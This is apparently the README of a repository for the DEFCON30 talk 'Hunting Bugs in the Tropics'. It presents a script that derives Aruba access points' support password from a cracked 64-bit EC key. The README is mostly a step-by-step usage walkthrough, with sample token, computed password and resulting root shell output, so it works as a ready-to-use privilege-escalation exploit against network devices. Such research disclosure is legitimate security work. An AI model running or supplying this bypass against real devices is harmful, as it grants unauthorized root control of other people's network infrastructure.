# Hunting Bugs in the Tropics

This is a repo with the slides used in my presentation "Hunting Bugs in the Tropics" at DEFCON30. It includes the Python script used to calculate the support password based on the private key obtained by breaking Aruba support's EC public key, due to its weak size (64 bits). This allows you to break out of the subshell on these devices, and obtain a full root shell.

You can use it running `support` on the AP CLI, and supplying an arbitrary username:

```
# support
Username (Please enter with @domain.com, in lowercase): a

Token: ED14-B132-D4BB-D428
Please generate one time password at https://ase.arubanetworks.com/decode_aos_key
Support Password:
```

then passing the username and Token value to the `support-access.py` script in this repository.

```
$ ./support-access.py a ED14-B132-D4BB-D428
Password: 4197d68283f73d5c
```

Paste the response as the Support Password:

```
Support Password: 4197d68283f73d5c
Switching to Full Access
~ # whoami
root
```

